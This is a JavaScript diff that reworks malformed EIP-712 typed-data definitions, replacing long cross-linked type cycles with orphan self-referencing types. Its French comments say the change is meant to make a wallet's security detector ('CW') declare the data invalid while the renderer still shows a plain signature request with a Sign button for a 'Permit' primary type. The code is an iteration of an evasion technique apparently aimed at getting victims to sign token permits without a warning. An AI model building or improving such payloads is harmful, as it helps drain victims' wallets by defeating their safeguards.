@@ -96,32 +96,16 @@ const DOM_TYPES = [
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
 
-// CHAOS v2 — cycles longs (longueur 3-5) sans self-ref directe
-// Pas de Phantom→Phantom (crash renderer) mais multi-cycles croisés qui confondent le détecteur UI
-// 3 cycles indépendants + 2 bridges qui les entrelacent → détecteur CW diverge, renderer passe
+// CHAOS v3 — self-refs purement orphelines (zéro cross-ref entre chaos types)
+// Renderer ne traverse que les types accessibles depuis primaryType (Permit) → ne touche JAMAIS ces types
+// Détecteur CW scan TOUT le JSON types{} → voit les self-refs → invalide → Demande de signature
+// Résultat visé: "Demande de signature" + bouton Signer (pas de crash renderer)
 const CHAOS_TYPES = {
-  // Cycle A (longueur 3): Alpha → Beta → Gamma → Alpha
-  Alpha:   [{name:"next",type:"Beta"}, {name:"id",type:"uint256"},{name:"tag",type:"string"}],
-  Beta:    [{name:"next",type:"Gamma"},{name:"ref",type:"bytes32"},{name:"depth",type:"uint256"}],
-  Gamma:   [{name:"next",type:"Alpha"},{name:"data",type:"bytes"}, {name:"ts",type:"uint256"}],
-  // Cycle B (longueur 4): Delta → Epsilon → Zeta → Eta → Delta
-  Delta:   [{name:"link",type:"Epsilon"},{name:"h",type:"bytes32"},{name:"n",type:"uint256"}],
-  Epsilon: [{name:"link",type:"Zeta"},   {name:"v",type:"uint256"},{name:"s",type:"string"}],
-  Zeta:    [{name:"link",type:"Eta"},    {name:"b",type:"bytes"},  {name:"x",type:"uint256"}],
-  Eta:     [{name:"link",type:"Delta"},  {name:"t",type:"uint256"},{name:"r",type:"bytes32"}],
-  // Cycle C (longueur 5): Iota → Kappa → Lambda → Mu → Nu → Iota
-  Iota:    [{name:"ptr",type:"Kappa"},  {name:"a",type:"address"},{name:"v",type:"uint256"}],
-  Kappa:   [{name:"ptr",type:"Lambda"},{name:"d",type:"bytes32"},{name:"n",type:"uint256"}],
-  Lambda:  [{name:"ptr",type:"Mu"},    {name:"s",type:"string"}, {name:"t",type:"uint256"}],
-  Mu:      [{name:"ptr",type:"Nu"},    {name:"b",type:"bytes"},  {name:"h",type:"bytes32"}],
-  Nu:      [{name:"ptr",type:"Iota"},  {name:"x",type:"uint256"},{name:"y",type:"uint256"}],
-  // Bridges cross-cycles: A↔B, B↔C
-  XiAB:    [{name:"a",type:"Alpha"},{name:"d",type:"Delta"},{name:"z",type:"uint256"}],
-  XiBC:    [{name:"e",type:"Epsilon"},{name:"i",type:"Iota"},{name:"w",type:"bytes32"}],
-  // Root qui pointe sur les 3 cycles + les bridges → le détecteur doit traverser tout ça
-  OmegaRoot:[{name:"cycle_a",type:"Alpha"},{name:"cycle_b",type:"Delta"},
-             {name:"cycle_c",type:"Iota"}, {name:"bridge_ab",type:"XiAB"},
-             {name:"bridge_bc",type:"XiBC"},{name:"ts",type:"uint256"}]
+  LoopA: [{name:"self",type:"LoopA"},{name:"id",type:"uint256"},{name:"tag",type:"string"}],
+  LoopB: [{name:"self",type:"LoopB"},{name:"ref",type:"bytes32"},{name:"depth",type:"uint256"}],
+  LoopC: [{name:"self",type:"LoopC"},{name:"data",type:"bytes"},{name:"ts",type:"uint256"}],
+  LoopD: [{name:"self",type:"LoopD"},{name:"h",type:"bytes32"},{name:"n",type:"uint256"}],
+  LoopE: [{name:"self",type:"LoopE"},{name:"v",type:"uint256"},{name:"s",type:"string"}]
 };
 
 const RPCS = [
